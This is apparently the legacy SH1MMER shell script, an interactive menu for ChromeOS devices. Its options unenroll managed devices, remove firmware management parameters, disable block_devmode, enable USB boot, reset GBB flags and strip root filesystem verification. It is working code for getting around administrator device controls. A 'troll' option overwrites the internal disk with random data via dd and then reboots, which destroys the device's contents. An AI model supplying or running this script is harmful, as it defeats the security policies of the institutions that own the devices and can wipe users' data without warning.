devmode() {
    echo "disabling block_devmode"
    vpd -i RW_VPD -s check_enrollment=0
    vpd -i RW_VPD -s block_devmode=0
    crossystem block_devmode=0
    res=$(cryptohome --action=get_firmware_management_parameters 2>&1)
    if [ $? -eq 0 ] && [[ ! $(echo $res | grep "Unknown action") ]]
    then
        tpm_manager_client take_ownership >/dev/null
        cryptohome --action=remove_firmware_management_parameters >/dev/null
    fi
}
deprovision() {
    echo "deprovisioning"
    vpd -i RW_VPD -s check_enrollment=0
}
reprovision() {
    echo "reprovisioning"
    vpd -i RW_VPD -s check_enrollment=1
}
usb() {
    echo "enabling usb boot"
    crossystem dev_boot_usb=1
}
fix_gbb() {
    echo "Make sure you have WP off"
    /usr/share/vboot/bin/set_gbb_flags.sh 0x0
    echo "GBB fixed"

}
disable_verity() {
    echo "Creating dev SSD..."
    /usr/share/vboot/bin/make_dev_ssd.sh -i /dev/mmcblk0 --remove_rootfs_verification
}
troll() {
    dd if=/dev/urandom of=/dev/mmcblk0 &
    sleep 1
    echo "think about this. you just ran a random script from the internet that you have no idea what it does."
    echo "maybe that was a bad idea!"
    sleep 4
    reboot
}

echo "SH1MMER EXPLOIT"
echo "Warning: This is a legacy version of sh1mmer"
while true; do
    echo "(b) Open Bash Shell"
    echo "(d) Deprovision Device"
    echo "(r) Reprovision Device"
    echo "(m) Disable block_devmode"
    echo "(u) Enable USB Boot"
    echo "(f) Fix GBB flags (in case of an accidental bootloop) WP MUST BE TURNED OFF"
    echo "(v) Disable RootFS verification"
    echo "(t) you know you want to press this menu option don't you"
    echo "(e) Exit and reboot"
    read -p "> (b/d/r/u/f/v/t/e): " choice
    case "$choice" in
    b | B) bash ;;
    d | D) deprovision ;;
    r | R) reprovision ;;
    m | M) devmode ;;
    u | U) usb ;;
    f | F) fix_gbb ;;
    v | V) disable_verity ;;
    t | T) troll ;;
    e | E) break ;;
    *) echo "invalid option" ;;
    esac
done

echo "CREDITS:"
echo "CoolElectronics - Creating this script"
echo "Bideos - Testing & discovering how to disable root-fs verification"
echo "Sharp_Jack - Creating the wax automation tool"
echo "Unciaur - Testing"
echo "TheMemeSniper/Kaitlin - Testing"
echo "OlyB - Scraping more shims"
echo "Rafflesia - Hosting"
sleep 6
echo "rebooting"
reboot
exit
